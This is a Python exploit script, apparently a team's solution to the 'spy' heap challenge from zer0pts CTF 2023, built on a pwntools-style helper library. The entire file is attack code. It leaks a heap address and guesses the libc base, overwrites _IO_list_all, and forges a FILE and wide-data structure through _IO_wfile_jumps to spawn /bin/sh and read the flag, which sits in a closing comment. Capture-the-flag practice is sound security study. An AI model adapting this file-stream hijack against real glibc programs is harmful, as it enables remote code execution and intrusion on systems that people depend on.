#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './spy'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'lremote', 'remote')
env.set_item('mode',    local = 'PROC', lremote = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        lremote = {'host':'localhost', 'port':9001},\
                        remote  = {'host':'pwn.2023.zer0pts.com', 'port':9001})
env.set_item('libc',    local   = None, \
                        lremote = 'libc.so.6', \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn, **kwargs):
    sp = Spy(conn)

    id_a = sp.add_citizen(b'a'*2)
    sp.add_citizen(b'b'*2)
    sp.add_citizen(b'c'*2)
    sp.add_citizen(b'd'*2)

    sp.mark_spy(id_a)

    sp.add_citizen(b'e'*2)
    sp.add_citizen(b'f'*2)
    sp.add_citizen(b'g'*2)

    addr_data_0x40 = sp.print_spy()[0] - 0xf80
    info('addr_data_0x40    = 0x{:08x}'.format(addr_data_0x40))
    addr_data_0x100 = addr_data_0x40 + 0x2000

    # libc.address = int(input('libc >'), 16)
    # libc.address = addr_data_0x40 + 0x2d000
    if env.check('local'):
        libc.address = ((addr_data_0x40 + 0x100000) & ~(0x100000-1)) if (addr_data_0x40 >> 24)&0xf == 3 else ((addr_data_0x40 & ~(0x100000-1)) - 0x200000)
    else:
        libc.address = addr_data_0x40 + 0xf5000
    info('trying addr_libc_base as 0x{:08x}'.format(libc.address))
    addr_libc_system        = libc.sep_function['system']
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    addr_libc_wfile_jumps   = libc.symbols['_IO_wfile_jumps']

    sp.give_id(addr_libc_io_list_all-0x10)

    sp.add_citizen((b'\x00'*4+p64(addr_libc_system)).ljust(0x30, b'h'))

    exploit  = b'\x00'*4
    exploit += p64(addr_data_0x100 + 0xf10)
    exploit += p64(0)*3
    sp.add_citizen(exploit)

    fake_file  = p32(0xfbad2086 & ~2) + b';/bin/sh' + p32(0)
    fake_file += p64(0)*15
    fake_file += flat(addr_data_0x100, 0, 0, addr_data_0x100+0xe10)
    fake_file += p64(0)*3
    fake_file += p32(1)
    fake_file += p32(0)
    fake_file += p64(0)*2
    fake_file += p64(addr_libc_wfile_jumps)
    sp.add_citizen(b'\x00'*4 + fake_file)

    fake_widedata  = p64(0)*4
    fake_widedata += p64(1)
    fake_widedata += p64(0)*23
    fake_widedata += p64(addr_data_0x40 + 0xfd0 - 0x68)
    sp.add_citizen(b'\x00'*4 + fake_widedata)

    conn.sendlineafter(b'> ', b'0')

    conn.sendline(b'cat /flag*')

class Spy:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add_citizen(self, name):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'person: ', name)
        self.recvuntil(b'ID: ')
        return int(self.recvline())

    def upgrade_info(self, ident, name):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'ID: ', str(ident).encode())
        self.sendlineafter(b'name: ', name)

    def mark_spy(self, ident):
        self.sendlineafter(b'> ', b'4')
        self.sendlineafter(b'suspect: ', str(ident).encode())

    def give_id(self, ident):
        self.sendlineafter(b'> ', b'5')
        self.sendlineafter(b'ID: ', str(ident).encode())

    def print_spy(self):
        self.sendlineafter(b'> ', b'6')
        self.recvuntil(b'ID: ')
        ident = int(self.recvline())
        self.recvuntil(b'Name: ')
        name = self.recvline()
        return (ident, name)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # zer0pts{cH3ck_0bj3cT_L1f3T1m3_4nd_s0uNDn3$$_wH3nEv3R_U_L34rn_a_n3w_l4ngU4g3}

if __name__=='__main__':
    main()

#==========
